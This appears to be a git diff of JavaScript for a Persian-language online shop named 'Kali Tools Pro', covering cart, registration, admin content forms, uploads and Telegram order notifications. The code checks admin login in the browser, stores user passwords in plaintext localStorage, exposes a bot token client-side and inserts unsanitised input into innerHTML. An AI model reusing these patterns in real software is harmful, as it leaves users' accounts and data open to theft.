-        const file = e.target.files[0];
-        if (file) {
-            // Check file type
-            if (fileType === 'image' && !file.type.match('image.*')) {
-                showToast('لطفاً فقط تصویر آپلود کنید', 'error');
-                inputElement.value = '';
-                return;
-            }
-            
-            if (fileType === 'video' && !file.type.match('video.*')) {
-                showToast('لطفاً فقط ویدیو آپلود کنید', 'error');
-                inputElement.value = '';
-                return;
-            }
-            
-            // Check file size
-            const maxSize = fileType === 'image' ? 50 * 1024 * 1024 : 500 * 1024 * 1024;
-            if (file.size > maxSize) {
-                showToast(`حجم فایل باید کمتر از ${fileType === 'image' ? '۵۰' : '۵۰۰'} مگابایت باشد`, 'error');
-                inputElement.value = '';
-                return;
-            }
-            
-            if (fileType === 'image') {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    previewElement.src = e.target.result;
-                    previewElement.style.display = 'block';
-                    uploadElement.querySelector('p').textContent = 'تصویر انتخاب شد';
-                };
-                reader.readAsDataURL(file);
-            } else if (fileType === 'video') {
-                const url = URL.createObjectURL(file);
-                previewElement.src = url;
-                previewElement.style.display = 'block';
-                uploadElement.querySelector('p').textContent = 'ویدیو انتخاب شد';
+            // Video modal functionality
+            closeVideoModal.addEventListener('click', () => {
+                videoModal.classList.remove('active');
+                videoModalPlayer.pause();
+                videoModalPlayer.currentTime = 0;
+                document.body.style.overflow = 'auto';
+            });
+
+            // Logout functionality
+            logoutBtn.addEventListener('click', () => {
+                adminPanel.classList.remove('active');
+                isAdminLoggedIn = false;
+                localStorage.removeItem('adminLoggedIn');
+                showToast('با موفقیت از سیستم خارج شدید', 'success');
+            });
+
+            // Mobile menu functionality
+            mobileMenuBtn.addEventListener('click', () => {
+                mobileMenu.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+
+            closeMobileMenu.addEventListener('click', () => {
+                mobileMenu.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+
+            // Scroll to products section
+            viewProductsBtn.addEventListener('click', () => {
+                document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
+            });
+
+            // Scroll to videos section
+            viewVideosBtn.addEventListener('click', () => {
+                document.getElementById('videos').scrollIntoView({ behavior: 'smooth' });
+            });
+
+            // Add to cart functionality
+            document.addEventListener('click', function(e) {
+                if (e.target.classList.contains('add-to-cart') || e.target.closest('.add-to-cart')) {
+                    const button = e.target.classList.contains('add-to-cart') ? e.target : e.target.closest('.add-to-cart');
+                    const id = button.getAttribute('data-id');
+                    const name = button.getAttribute('data-name');
+                    const price = parseInt(button.getAttribute('data-price'));
+                    
+                    const existingItem = cart.find(item => item.id === id);
+                    
+                    if (existingItem) {
+                        existingItem.quantity += 1;
+                    } else {
+                        cart.push({
+                            id,
+                            name,
+                            price,
+                            quantity: 1
+                        });
+                    }
+                    
+                    updateCart();
+                    showToast(`"${name}" به سبد خرید اضافه شد`, 'success');
+                }
+            });
+
+            // Play video functionality
+            document.addEventListener('click', function(e) {
+                if (e.target.classList.contains('video-play-btn') || e.target.closest('.video-play-btn')) {
+                    const button = e.target.classList.contains('video-play-btn') ? e.target : e.target.closest('.video-play-btn');
+                    const videoUrl = button.getAttribute('data-video');
+                    
+                    if (videoUrl) {
+                        videoModalPlayer.src = SERVER_URL + videoUrl;
+                        videoModal.classList.add('active');
+                        document.body.style.overflow = 'hidden';
+                    }
+                }
+            });
+
+            // Checkout form submission
+            checkoutForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
                 
-                // Auto-calculate duration for videos
-                previewElement.onloadedmetadata = function() {
-                    const duration = previewElement.duration;
-                    const minutes = Math.floor(duration / 60);
-                    const seconds = Math.floor(duration % 60);
-                    document.getElementById('video-duration').value = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                const customerName = document.getElementById('customer-name').value;
+                const customerPhone = document.getElementById('customer-phone').value;
+                const customerTelegram = document.getElementById('customer-telegram').value;
+                const customerAddress = document.getElementById('customer-address').value;
+                const paymentMethod = document.querySelector('input[name="payment"]:checked').value;
+                
+                // Send order to Telegram
+                const success = await sendOrderToTelegram(customerName, customerPhone, customerTelegram, customerAddress, paymentMethod);
+                
+                if (success) {
+                    showToast('سفارش شما با موفقیت ثبت شد! به زودی با شما تماس گرفته خواهد شد.', 'success');
+                    cart = [];
+                    updateCart();
+                    checkoutForm.reset();
+                    checkoutModal.style.display = 'none';
+                    overlay.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                } else {
+                    showToast('خطا در ارسال سفارش. لطفاً دوباره تلاش کنید.', 'error');
+                }
+            });
+
+            // Login form submission
+            loginForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                if (email === adminEmail && password === adminPassword) {
+                    showToast('ورود به پنل مدیریت با موفقیت انجام شد!', 'success');
+                    loginModal.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                    loginForm.reset();
+                    
+                    isAdminLoggedIn = true;
+                    localStorage.setItem('adminLoggedIn', 'true');
+                    adminPanel.classList.add('active');
+                    adminPanel.scrollIntoView({ behavior: 'smooth' });
+                } else {
+                    // Check regular users
+                    const user = users.find(u => u.email === email && u.password === password);
+                    if (user) {
+                        showToast('ورود با موفقیت انجام شد!', 'success');
+                        loginModal.style.display = 'none';
+                        document.body.style.overflow = 'auto';
+                        loginForm.reset();
+                    } else {
+                        showToast('ایمیل یا رمز عبور اشتباه است', 'error');
+                    }
+                }
+            });
+
+            // Register form submission
+            registerForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const name = document.getElementById('register-name').value;
+                const email = document.getElementById('register-email').value;
+                const phone = document.getElementById('register-phone').value;
+                const password = document.getElementById('register-password').value;
+                
+                // Check if user already exists
+                const existingUser = users.find(u => u.email === email);
+                if (existingUser) {
+                    showToast('این ایمیل قبلاً ثبت شده است', 'error');
+                    return;
+                }
+                
+                // Create new user
+                const newUser = {
+                    id: Date.now(),
+                    name,
+                    email,
+                    phone,
+                    password,
+                    registrationDate: new Date().toLocaleDateString('fa-IR')
                 };
+                
+                users.push(newUser);
+                localStorage.setItem('kali_tools_users', JSON.stringify(users));
+                
+                // Send registration notification to Telegram
+                sendTelegramNotification(
+                    `👤 کاربر جدید ثبت نام کرد:\n\n📌 نام: ${name}\n📧 ایمیل: ${email}\n📞 تلفن: ${phone}\n📅 تاریخ: ${newUser.registrationDate}\n\nبه خانواده Kali Tools Pro خوش آمدید! 🎉`
+                );
+                
+                showToast('ثبت نام با موفقیت انجام شد!', 'success');
+                registerModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                registerForm.reset();
+            });
+
+            // Admin tabs
+            document.querySelectorAll('.admin-tab').forEach(tab => {
+                tab.addEventListener('click', () => {
+                    const tabId = tab.getAttribute('data-tab');
+                    switchTab(tabId);
+                });
+            });
+
+            // File uploads
+            setupFileUpload('gallery-image-upload', 'gallery-image-input', 'gallery-image-preview', 'image');
+            setupFileUpload('product-image-upload', 'product-image-input', 'product-image-preview', 'image');
+            setupFileUpload('product-video-upload', 'product-video-input', 'product-video-preview', 'video');
+            setupFileUpload('video-file-upload', 'video-file-input', 'video-file-preview', 'video');
+            setupFileUpload('video-thumbnail-upload', 'video-thumbnail-input', 'video-thumbnail-preview', 'image');
+
+            // Admin forms
+            setupAdminForms();
+
+            // Backup functionality
+            backupBtn.addEventListener('click', backupData);
+
+            // Restore functionality
+            document.getElementById('restore-btn').addEventListener('click', () => {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = '.json';
+                input.onchange = function(e) {
+                    if (e.target.files.length > 0) {
+                        restoreData(e.target.files[0]);
+                    }
+                };
+                input.click();
+            });
+
+            // Smooth scrolling for navigation links
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    const target = document.querySelector(this.getAttribute('href'));
+                    if (target) {
+                        target.scrollIntoView({
+                            behavior: 'smooth',
+                            block: 'start'
+                        });
+                    }
+                    // Close mobile menu after clicking a link
+                    mobileMenu.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                });
+            });
+
+            // Header scroll effect
+            window.addEventListener('scroll', () => {
+                const header = document.getElementById('header');
+                if (window.scrollY > 100) {
+                    header.classList.add('header-scrolled');
+                } else {
+                    header.classList.remove('header-scrolled');
+                }
+            });
+
+            // Delete functionality for gallery items in admin
+            document.addEventListener('click', function(e) {
+                if (e.target.classList.contains('delete-gallery-item-list') || e.target.closest('.delete-gallery-item-list')) {
+                    const button = e.target.classList.contains('delete-gallery-item-list') ? e.target : e.target.closest('.delete-gallery-item-list');
+                    const id = parseInt(button.getAttribute('data-id'));
+                    deleteGalleryItem(id);
+                }
+                
+                if (e.target.classList.contains('delete-product-list') || e.target.closest('.delete-product-list')) {
+                    const button = e.target.classList.contains('delete-product-list') ? e.target : e.target.closest('.delete-product-list');
+                    const id = parseInt(button.getAttribute('data-id'));
+                    deleteProduct(id);
+                }
+                
+                if (e.target.classList.contains('delete-video-list') || e.target.closest('.delete-video-list')) {
+                    const button = e.target.classList.contains('delete-video-list') ? e.target : e.target.closest('.delete-video-list');
+                    const id = parseInt(button.getAttribute('data-id'));
+                    deleteVideo(id);
+                }
+            });
+        }
+
+        // Send Telegram notification
+        function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram notification sent:', data);
+            })
+            .catch(error => {
+                console.error('Error sending Telegram notification:', error);
+            });
+        }
+
+        // Send order to Telegram
+        async function sendOrderToTelegram(name, phone, telegram, address, payment) {
+            try {
+                let orderDetails = `🛒 سفارش جدید:\n\n`;
+                orderDetails += `👤 نام مشتری: ${name}\n`;
+                orderDetails += `📞 تلفن: ${phone}\n`;
+                if (telegram) orderDetails += `📱 تلگرام: ${telegram}\n`;
+                if (address) orderDetails += `🏠 آدرس: ${address}\n`;
+                orderDetails += `💳 روش پرداخت: ${payment}\n\n`;
+                orderDetails += `🛍️ محصولات:\n`;
+                
+                let total = 0;
+                cart.forEach(item => {
+                    orderDetails += `• ${item.name} - ${item.quantity} عدد - ${formatPrice(item.price * item.quantity)} AFN\n`;
+                    total += item.price * item.quantity;
+                });
+                
+                orderDetails += `\n💰 جمع کل: ${formatPrice(total)} AFN`;
+                orderDetails += `\n\n📅 تاریخ: ${new Date().toLocaleDateString('fa-IR')}`;
+                orderDetails += `\n⏰ زمان: ${new Date().toLocaleTimeString('fa-IR')}`;
+                
+                sendTelegramNotification(orderDetails);
+                return true;
+            } catch (error) {
+                console.error('Error sending order to Telegram:', error);
+                return false;
             }
         }
-    });
-}
 
-// Setup admin forms
-function setupAdminForms() {
-    // Hero form
-    document.getElementById('hero-form').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const title = document.getElementById('hero-title-input').value;
-        const description = document.getElementById('hero-description-input').value;
-        
-        document.getElementById('hero-title').textContent = title;
-        document.getElementById('hero-description').textContent = description;
-        
-        // Save to localStorage
-        const success = await saveToServer('hero', { title, description });
-        if (success) {
-            showToast('بخش اصلی با موفقیت بهروزرسانی شد', 'success');
-            updateLastUpdate();
-        } else {
-            showToast('خطا در ذخیرهسازی دادهها', 'error');
-        }
-    });
-
-    // Features form
-    document.getElementById('feature-form').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const title = document.getElementById('feature-title').value;
-        const description = document.getElementById('feature-description').value;
-        
-        document.getElementById('features-title').textContent = title;
-        document.getElementById('features-description').textContent = description;
-        
-        // Save features from form
-        const featureElements = document.querySelectorAll('.feature-admin-item');
-        features = [];
-        
-        featureElements.forEach((element, index) => {
-            const icon = element.querySelector('.feature-icon').value;
-            const title = element.querySelector('.feature-title').value;
-            const description = element.querySelector('.feature-description').value;
+        // Switch admin tab
+        function switchTab(tabId) {
+            // Update active tab
+            document.querySelectorAll('.admin-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelector(`.admin-tab[data-tab="${tabId}"]`).classList.add('active');
             
-            if (icon && title && description) {
-                features.push({
-                    id: index + 1,
-                    icon,
+            // Update active tab content
+            document.querySelectorAll('.admin-tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.getElementById(`${tabId}-tab`).classList.add('active');
+            
+            // Load tab-specific data
+            if (tabId === 'gallery') {
+                loadGalleryAdmin();
+            } else if (tabId === 'products') {
+                loadProductsAdmin();
+            } else if (tabId === 'videos') {
+                loadVideosAdmin();
+            } else if (tabId === 'features') {
+                loadFeaturesAdmin();
+            } else if (tabId === 'ethical') {
+                loadEthicalAdmin();
+            } else if (tabId === 'footer') {
+                loadFooterAdmin();
+            } else if (tabId === 'hero') {
+                loadHeroAdmin();
+            }
+            
+            currentAdminTab = tabId;
+        }
+
+        // Setup file upload
+        function setupFileUpload(uploadElementId, inputElementId, previewElementId, fileType) {
+            const uploadElement = document.getElementById(uploadElementId);
+            const inputElement = document.getElementById(inputElementId);
+            const previewElement = document.getElementById(previewElementId);
+            
+            uploadElement.addEventListener('click', () => {
+                inputElement.click();
+            });
+            
+            inputElement.addEventListener('change', (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    // Check file type
+                    if (fileType === 'image' && !file.type.match('image.*')) {
+                        showToast('لطفاً فقط تصویر آپلود کنید', 'error');
+                        inputElement.value = '';
+                        return;
+                    }
+                    
+                    if (fileType === 'video' && !file.type.match('video.*')) {
+                        showToast('لطفاً فقط ویدیو آپلود کنید', 'error');
+                        inputElement.value = '';
+                        return;
+                    }
+                    
+                    // Check file size
+                    const maxSize = fileType === 'image' ? 50 * 1024 * 1024 : 500 * 1024 * 1024;
+                    if (file.size > maxSize) {
+                        showToast(`حجم فایل باید کمتر از ${fileType === 'image' ? '۵۰' : '۵۰۰'} مگابایت باشد`, 'error');
+                        inputElement.value = '';
+                        return;
+                    }
+                    
+                    if (fileType === 'image') {
+                        const reader = new FileReader();
+                        reader.onload = (e) => {
+                            previewElement.src = e.target.result;
+                            previewElement.style.display = 'block';
+                            uploadElement.querySelector('p').textContent = 'تصویر انتخاب شد';
+                        };
+                        reader.readAsDataURL(file);
+                    } else if (fileType === 'video') {
+                        const url = URL.createObjectURL(file);
+                        previewElement.src = url;
+                        previewElement.style.display = 'block';
+                        uploadElement.querySelector('p').textContent = 'ویدیو انتخاب شد';
+                        
+                        // Auto-calculate duration for videos
+                        previewElement.onloadedmetadata = function() {
+                            const duration = previewElement.duration;
+                            const minutes = Math.floor(duration / 60);
+                            const seconds = Math.floor(duration % 60);
+                            document.getElementById('video-duration').value = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                        };
+                    }
+                }
+            });
+        }
+
+        // Setup admin forms
+        function setupAdminForms() {
+            // Hero form
+            document.getElementById('hero-form').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const title = document.getElementById('hero-title-input').value;
+                const description = document.getElementById('hero-description-input').value;
+                
+                document.getElementById('hero-title').textContent = title;
+                document.getElementById('hero-description').textContent = description;
+                
+                // Save to localStorage
+                const success = await saveToServer('hero', { title, description });
+                if (success) {
+                    showToast('بخش اصلی با موفقیت بهروزرسانی شد', 'success');
+                    updateLastUpdate();
+                } else {
+                    showToast('خطا در ذخیرهسازی دادهها', 'error');
+                }
+            });
+
+            // Features form
+            document.getElementById('feature-form').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const title = document.getElementById('feature-title').value;
+                const description = document.getElementById('feature-description').value;
+                
+                document.getElementById('features-title').textContent = title;
+                document.getElementById('features-description').textContent = description;
+                
+                // Save features from form
+                const featureElements = document.querySelectorAll('.feature-admin-item');
+                features = [];
+                
+                featureElements.forEach((element, index) => {
+                    const icon = element.querySelector('.feature-icon').value;
+                    const title = element.querySelector('.feature-title').value;
+                    const description = element.querySelector('.feature-description').value;
+                    
+                    if (icon && title && description) {
+                        features.push({
+                            id: index + 1,
+                            icon,
+                            title,
+                            description
+                        });
+                    }
+                });
+                
+                // Save to localStorage
+                const success = await saveToServer('features', features);
+                if (success) {
+                    loadFeatures();
+                    showToast('بخش امکانات با موفقیت بهروزرسانی شد', 'success');
+                    updateLastUpdate();
+                } else {
+                    showToast('خطا در ذخیرهسازی دادهها', 'error');
+                }
+            });
+
+            // Gallery form
+            document.getElementById('add-gallery-item-btn').addEventListener('click', async () => {
+                const title = document.getElementById('gallery-image-title').value;
+                const description = document.getElementById('gallery-image-desc').value;
+                const imageInput = document.getElementById('gallery-image-input');
+                
+                if (!title || !description || !imageInput.files[0]) {
+                    showToast('لطفاً تمام فیلدها را پر کنید و تصویر آپلود کنید', 'error');
+                    return;
+                }
+                
+                try {
+                    showToast('در حال آپلود تصویر...', 'success');
+                    
+                    // Simulate file upload
+                    const file = imageInput.files[0];
+                    const uploadResult = await uploadFile(file, 'image');
+                    
+                    if (uploadResult.success) {
+                        const newItem = {
+                            id: galleryItems.length > 0 ? Math.max(...galleryItems.map(item => item.id)) + 1 : 1,
+                            image: uploadResult.fileUrl,
+                            title: title,
+                            description: description,
+                            type: 'image'
+                        };
+                        
+                        galleryItems.push(newItem);
+                        
+                        // Save to localStorage
+                        const success = await saveToServer('gallery', galleryItems);
+                        if (success) {
+                            loadGalleryItems();
+                            loadGalleryAdmin();
+                            document.getElementById('gallery-form').reset();
+                            document.getElementById('gallery-image-preview').style.display = 'none';
+                            document.getElementById('gallery-image-upload').querySelector('p').textContent = 'برای آپلود تصویر کلیک کنید';
+                            showToast('تصویر جدید به گالری اضافه شد', 'success');
+                            updateAdminStats();
+                            updateLastUpdate();
+                        } else {
+                            showToast('خطا در ذخیرهسازی دادهها', 'error');
+                        }
+                    } else {
+                        showToast('خطا در آپلود تصویر', 'error');
+                    }
+                } catch (error) {
+                    console.error('Error adding gallery item:', error);
+                    showToast('خطا در افزودن تصویر به گالری', 'error');
+                }
+            });
+
+            // Products form
+            document.getElementById('add-product-btn').addEventListener('click', async () => {
+                const name = document.getElementById('product-name').value;
+                const category = document.getElementById('product-category').value;
+                const price = document.getElementById('product-price').value;
+                const description = document.getElementById('product-description').value;
+                const imageInput = document.getElementById('product-image-input');
+                
+                if (!name || !category || !price || !description || !imageInput.files[0]) {
+                    showToast('لطفاً تمام فیلدها را پر کنید و تصویر آپلود کنید', 'error');
+                    return;
+                }
+                
+                try {
+                    showToast('در حال آپلود محصول...', 'success');
+                    
+                    // Upload image
+                    const file = imageInput.files[0];
+                    const uploadResult = await uploadFile(file, 'image');
+                    
+                    if (uploadResult.success) {
+                        let videoUrl = '';
+                        const videoFileInput = document.getElementById('product-video-input');
+                        const videoFile = videoFileInput.files[0];
+                        
+                        if (videoFile) {
+                            const videoUploadResult = await uploadFile(videoFile, 'video');
+                            if (videoUploadResult.success) {
+                                videoUrl = videoUploadResult.fileUrl;
+                            }
+                        }
+                        
+                        const newProduct = {
+                            id: products.length > 0 ? Math.max(...products.map(product => product.id)) + 1 : 1,
+                            name: name,
+                            category: category,
+                            price: parseInt(price),
+                            description: description,
+                            image: uploadResult.fileUrl,
+                            video: videoUrl
+                        };
+                        
+                        products.push(newProduct);
+                        
+                        // Save to localStorage
+                        const success = await saveToServer('products', products);
+                        if (success) {
+                            loadProducts();
+                            loadProductsAdmin();
+                            document.getElementById('product-form').reset();
+                            document.getElementById('product-image-preview').style.display = 'none';
+                            document.getElementById('product-video-preview').style.display = 'none';
+                            document.getElementById('product-image-upload').querySelector('p').textContent = 'برای آپلود تصویر کلیک کنید';
+                            document.getElementById('product-video-upload').querySelector('p').textContent = 'برای آپلود ویدیو کلیک کنید';
+                            showToast('محصول جدید با موفقیت اضافه شد', 'success');
+                            updateAdminStats();
+                            updateLastUpdate();
+                        } else {
+                            showToast('خطا در ذخیرهسازی دادهها', 'error');
+                        }
+                    } else {
+                        showToast('خطا در آپلود تصویر', 'error');
+                    }
+                } catch (error) {
+                    console.error('Error adding product:', error);
+                    showToast('خطا در افزودن محصول', 'error');
+                }
+            });
+
+            // Videos form
+            document.getElementById('add-video-btn').addEventListener('click', async () => {
+                const title = document.getElementById('video-title').value;
+                const category = document.getElementById('video-category').value;
+                const description = document.getElementById('video-description').value;
+                const duration = document.getElementById('video-duration').value;
+                const videoInput = document.getElementById('video-file-input');
+                
+                if (!title || !category || !description || !duration || !videoInput.files[0]) {
+                    showToast('لطفاً تمام فیلدها را پر کنید و ویدیو آپلود کنید', 'error');
+                    return;
+                }
+                
+                try {
+                    showToast('در حال آپلود ویدیو...', 'success');
+                    
+                    // Upload video
+                    const file = videoInput.files[0];
+                    const uploadResult = await uploadFile(file, 'video');
+                    
+                    if (uploadResult.success) {
+                        let thumbnailUrl = 'https://i.imgur.com/3Q7J5Qj.png'; // Default thumbnail
+                        const thumbnailFileInput = document.getElementById('video-thumbnail-input');
+                        const thumbnailFile = thumbnailFileInput.files[0];
+                        
+                        if (thumbnailFile) {
+                            const thumbnailUploadResult = await uploadFile(thumbnailFile, 'image');
+                            if (thumbnailUploadResult.success) {
+                                thumbnailUrl = thumbnailUploadResult.fileUrl;
+                            }
+                        }
+                        
+                        const newVideo = {
+                            id: videos.length > 0 ? Math.max(...videos.map(video => video.id)) + 1 : 1,
+                            title: title,
+                            description: description,
+                            videoUrl: uploadResult.fileUrl,
+                            thumbnail: thumbnailUrl,
+                            duration: duration,
+                            category: category
+                        };
+                        
+                        videos.push(newVideo);
+                        
+                        // Save to localStorage
+                        const success = await saveToServer('videos', videos);
+                        if (success) {
+                            loadVideos();
+                            loadVideosAdmin();
+                            document.getElementById('video-form').reset();
+                            document.getElementById('video-file-preview').style.display = 'none';
+                            document.getElementById('video-thumbnail-preview').style.display = 'none';
+                            document.getElementById('video-file-upload').querySelector('p').textContent = 'برای آپلود ویدیو کلیک کنید';
+                            document.getElementById('video-thumbnail-upload').querySelector('p').textContent = 'برای آپلود تصویر بندانگشتی کلیک کنید';
+                            showToast('ویدیو جدید با موفقیت اضافه شد', 'success');
+                            updateAdminStats();
+                            updateLastUpdate();
+                        } else {
+                            showToast('خطا در ذخیرهسازی دادهها', 'error');
+                        }
+                    } else {
+                        showToast('خطا در آپلود ویدیو', 'error');
+                    }
+                } catch (error) {
+                    console.error('Error adding video:', error);
+                    showToast('خطا در افزودن ویدیو', 'error');
+                }
+            });
+
+            // Ethical form
+            document.getElementById('ethical-form').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const title = document.getElementById('ethical-title').value;
+                const description = document.getElementById('ethical-description').value;
+                const warning = document.getElementById('ethical-warning').value;
+                const footer = document.getElementById('ethical-footer').value;
+                const allowed = document.getElementById('ethical-allowed').value;
+                const prohibited = document.getElementById('ethical-prohibited').value;
+                
+                document.getElementById('ethical-title').textContent = title;
+                document.getElementById('ethical-description').textContent = description;
+                document.getElementById('ethical-warning').innerHTML = `<h3><i class="fas fa-exclamation-triangle"></i> هشدار مسئولیت اخلاقی</h3><p>${warning}</p>`;
+                document.getElementById('ethical-footer').textContent = footer;
+                
+                // Update ethical list
+                document.getElementById('ethical-list').innerHTML = `
+                    <div class="ethical-item allowed">
+                        <div class="ethical-icon"><i class="fas fa-check-circle"></i></div>
+                        <div>
+                            <h4>موارد مجاز</h4>
+                            <p>${allowed}</p>
+                        </div>
+                    </div>
+                    <div class="ethical-item prohibited">
+                        <div class="ethical-icon"><i class="fas fa-times-circle"></i></div>
+                        <div>
+                            <h4>موارد غیرمجاز</h4>
+                            <p>${prohibited}</p>
+                        </div>
+                    </div>
+                `;
+                
+                // Save to localStorage
+                const success = await saveToServer('ethical', {
                     title,
-                    description
+                    description,
+                    warning: `<h3><i class="fas fa-exclamation-triangle"></i> هشدار مسئولیت اخلاقی</h3><p>${warning}</p>`,
+                    footer,
+                    allowed,
+                    prohibited
                 });
-            }
-        });
-        
-        // Save to localStorage
-        const success = await saveToServer('features', features);
-        if (success) {
-            loadFeatures();
-            showToast('بخش امکانات با موفقیت بهروزرسانی شد', 'success');
-            updateLastUpdate();
-        } else {
-            showToast('خطا در ذخیرهسازی دادهها', 'error');
-        }
-    });
-
-    // Gallery form
-    document.getElementById('add-gallery-item-btn').addEventListener('click', async () => {
-        const title = document.getElementById('gallery-image-title').value;
-        const description = document.getElementById('gallery-image-desc').value;
-        const imageInput = document.getElementById('gallery-image-input');
-        
-        if (!title || !description || !imageInput.files[0]) {
-            showToast('لطفاً تمام فیلدها را پر کنید و تصویر آپلود کنید', 'error');
-            return;
-        }
-        
-        try {
-            showToast('در حال آپلود تصویر...', 'success');
-            
-            // Simulate file upload
-            const file = imageInput.files[0];
-            const uploadResult = await uploadFile(file, 'image');
-            
-            if (uploadResult.success) {
-                const newItem = {
-                    id: galleryItems.length > 0 ? Math.max(...galleryItems.map(item => item.id)) + 1 : 1,
-                    image: uploadResult.fileUrl,
-                    title: title,
-                    description: description,
-                    type: 'image'
-                };
                 
-                galleryItems.push(newItem);
+                if (success) {
+                    showToast('بخش راهنمای اخلاقی با موفقیت بهروزرسانی شد', 'success');
+                    updateLastUpdate();
+                } else {
+                    showToast('خطا در ذخیرهسازی دادهها', 'error');
+                }
+            });
+
+            // Footer form
+            document.getElementById('footer-form').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const about = document.getElementById('footer-about').value;
+                const address = document.getElementById('footer-address').value;
+                const phone = document.getElementById('footer-phone').value;
+                const email = document.getElementById('footer-email').value;
+                const copyright = document.getElementById('footer-copyright').value;
+                
+                document.getElementById('footer-about-text').textContent = about;
+                document.getElementById('footer-address-text').textContent = address;
+                document.getElementById('footer-phone-text').textContent = phone;
+                document.getElementById('footer-email-text').textContent = email;
+                document.getElementById('footer-copyright-text').textContent = copyright;
+                
+                // Save to localStorage
+                const success = await saveToServer('footer', {
+                    about,
+                    address,
+                    phone,
+                    email,
+                    copyright
+                });
+                
+                if (success) {
+                    showToast('فوتر با موفقیت بهروزرسانی شد', 'success');
+                    updateLastUpdate();
+                } else {
+                    showToast('خطا در ذخیرهسازی دادهها', 'error');
+                }
+            });
+
+            // Add feature button
+            document.getElementById('add-feature-btn').addEventListener('click', () => {
+                const featuresList = document.getElementById('features-list');
+                const newFeatureId = features.length > 0 ? Math.max(...features.map(feature => feature.id)) + 1 : 1;
+                
+                const featureElement = document.createElement('div');
+                featureElement.className = 'feature-admin-item';
+                featureElement.innerHTML = `
+                    <div class="form-group">
+                        <label>آیکون</label>
+                        <input type="text" class="form-control feature-icon" value="fas fa-shield-alt" placeholder="کلاس آیکون FontAwesome">
+                    </div>
+                    <div class="form-group">
+                        <label>عنوان</label>
+                        <input type="text" class="form-control feature-title" placeholder="عنوان امکان">
+                    </div>
+                    <div class="form-group">
+                        <label>توضیحات</label>
+                        <textarea class="form-control feature-description" placeholder="توضیحات امکان"></textarea>
+                    </div>
+                    <button type="button" class="btn btn-danger remove-feature" data-id="${newFeatureId}"><i class="fas fa-trash"></i> حذف</button>
+                    <hr>
+                `;
+                
+                featuresList.appendChild(featureElement);
+                
+                // Add event listener to remove button
+                featureElement.querySelector('.remove-feature').addEventListener('click', function() {
+                    const id = parseInt(this.getAttribute('data-id'));
+                    featuresList.removeChild(featureElement);
+                });
+            });
+        }
+
+        // Load gallery items
+        function loadGalleryItems() {
+            galleryGrid.innerHTML = '';
+            
+            if (galleryItems.length === 0) {
+                galleryGrid.innerHTML = '<p style="text-align: center; grid-column: 1 / -1; color: var(--text-light); padding: 2rem;">هیچ تصویری در گالری وجود ندارد</p>';
+                return;
+            }
+            
+            galleryItems.forEach(item => {
+                const galleryItem = document.createElement('div');
+                galleryItem.className = 'gallery-item glass';
+                galleryItem.style.backgroundImage = `url('${item.image}')`;
+                galleryItem.innerHTML = `
+                    <div class="gallery-actions">
+                        <button class="gallery-action-btn delete-gallery-item" data-id="${item.id}">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </div>
+                    <div class="gallery-item-overlay">
+                        <h3>${item.title}</h3>
+                        <p>${item.description}</p>
+                    </div>
+                `;
+                galleryGrid.appendChild(galleryItem);
+            });
+            
+            // Add event listeners to delete buttons
+            document.querySelectorAll('.delete-gallery-item').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    const id = parseInt(button.getAttribute('data-id'));
+                    deleteGalleryItem(id);
+                });
+            });
+        }
+
+        // Load products
+        function loadProducts() {
+            productsGrid.innerHTML = '';
+            
+            if (products.length === 0) {
+                productsGrid.innerHTML = '<p style="text-align: center; grid-column: 1 / -1; color: var(--text-light); padding: 2rem;">هیچ محصولی وجود ندارد</p>';
+                return;
+            }
+            
+            products.forEach(product => {
+                const productCard = document.createElement('div');
+                productCard.className = 'product-card glass';
+                productCard.innerHTML = `
+                    <div class="product-image" style="background-image: url('${product.image}')">
+                        ${product.video ? `<button class="video-play-btn product-video-btn" data-video="${product.video}">
+                            <i class="fas fa-play"></i>
+                        </button>` : ''}
+                    </div>
+                    <div class="product-content">
+                        <div class="product-category">${product.category}</div>
+                        <h3 class="product-title">${product.name}</h3>
+                        <p class="product-description">${product.description}</p>
+                        <div class="product-footer">
+                            <div class="product-price"><span class="currency">AFN</span> ${formatPrice(product.price)}</div>
+                            <button class="btn btn-primary add-to-cart" data-id="${product.id}" data-name="${product.name}" data-price="${product.price}"><i class="fas fa-cart-plus"></i> افزودن</button>
+                        </div>
+                    </div>
+                `;
+                productsGrid.appendChild(productCard);
+            });
+            
+            // Add event listeners to video buttons
+            document.querySelectorAll('.product-video-btn').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    const videoUrl = button.getAttribute('data-video');
+                    if (videoUrl) {
+                        videoModalPlayer.src = SERVER_URL + videoUrl;
+                        videoModal.classList.add('active');
